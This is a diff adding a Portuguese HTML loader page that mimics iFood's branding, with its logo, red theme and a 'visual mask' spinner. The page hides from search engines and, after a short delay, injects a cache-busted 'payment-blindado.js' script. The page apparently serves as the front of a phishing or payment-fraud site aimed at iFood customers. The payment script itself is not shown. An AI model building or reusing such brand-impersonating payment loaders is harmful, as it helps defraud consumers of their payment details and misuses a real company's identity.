@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>    
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <script src="js/mobile-app-lock.js"></script>
+    <meta name="robots" content="noindex, nofollow"> <!-- Segurança extra -->
+    <meta name="theme-color" content="#EA1D2C">
+    
+    <title>Carregando...</title>
+    
+    <style>
+        /* Mantém a identidade visual do iFood/nobre enquanto carrega */
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background-color: #EA1D2C; display: flex; flex-direction: column; align-items: center; justify-content: center; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; overflow: hidden; }
+        .logo { width: 80px; margin-bottom: 20px; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.2)); }
+        .spinner { width: 30px; height: 30px; border: 3px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: #fff; animation: spin 0.8s linear infinite; }
+        .status { color: white; margin-top: 15px; font-size: 14px; font-weight: 500; opacity: 0.9; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
+    <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96" />
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+    <link rel="manifest" href="/site.webmanifest" />
+</head>
+<body>
+
+    <!-- MÁSCARA VISUAL (Loader Profissional) -->
+    <img src="images/ifood-white.webp" class="logo" onerror="this.style.display='none'">
+    <div class="spinner"></div>
+    <p class="status">Carregando...</p>
+
+    <!-- CARREGAMENTO BLINDADO COM ANTI-CACHE -->
+    <script>
+        (function() {
+            // Pequeno delay para a animação aparecer suavemente
+            setTimeout(function() {
+                var script = document.createElement('script');
+                // Adiciona timestamp (?v=...) para garantir que o cliente SEMPRE baixe a versão mais nova
+                script.src = "payment-blindado.js?v=" + new Date().getTime(); 
+                script.type = "text/javascript";
+                
+                // Tratamento de erro caso o JS falhe
+                script.onerror = function() {
+                    alert("Erro de conexão. Atualize a página.");
+                };
+                
+                document.body.appendChild(script);
+            }, 300);
+        })();
+    </script>
+
+</body>
+</html>
